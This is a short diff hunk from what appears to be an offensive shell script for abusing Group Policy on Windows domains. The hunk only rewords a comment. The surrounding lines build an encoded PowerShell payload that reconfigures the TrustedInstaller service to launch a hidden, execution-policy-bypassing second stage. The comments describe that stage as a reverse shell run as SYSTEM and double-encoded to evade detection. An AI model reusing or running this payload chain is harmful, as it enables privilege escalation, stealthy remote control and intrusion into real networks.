@@ -17,7 +17,7 @@ payload_stage2=$(python3 -c "import base64; print(base64.b64encode((r\"\"\"sc.ex
 
 # Stage 1: configures the TrustedInstaller service to first change its binary path to that of PowerShell and then uses it to spawn the Stage 2 payload as a child process of TI.
 # This also has the desirable side-effect of making the actual reverse shell double-encoded, which is a good thing for evasion purposes.
-# Note that because Group Policy objects execute commands as SYSTEM, we have the ability to change binary paths of services, including TI, by default.
+# Note that because GPO-mediated scheduled tasks execute commands as SYSTEM, we have the ability to change binary paths of services, including TI, by default.
 payload_stage1=$(python3 -c "import base64; print(base64.b64encode((r\"\"\"sc.exe config \"TrustedInstaller\" binpath= \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"; \$ti = Get-Service \"TrustedInstaller\"; \$ti.start(@(\"-ep\", \"bypass\", \"-WindowStyle\", \"Hidden\", \"-c\", \"Start-Process \'powershell.exe\' \-ArgumentList \'-ep bypass -WindowStyle Hidden -e $payload_stage2\'\"))\"\"\").encode(\"utf-16-le\")).decode())")
 
 if [ -d "backupgpo" ]
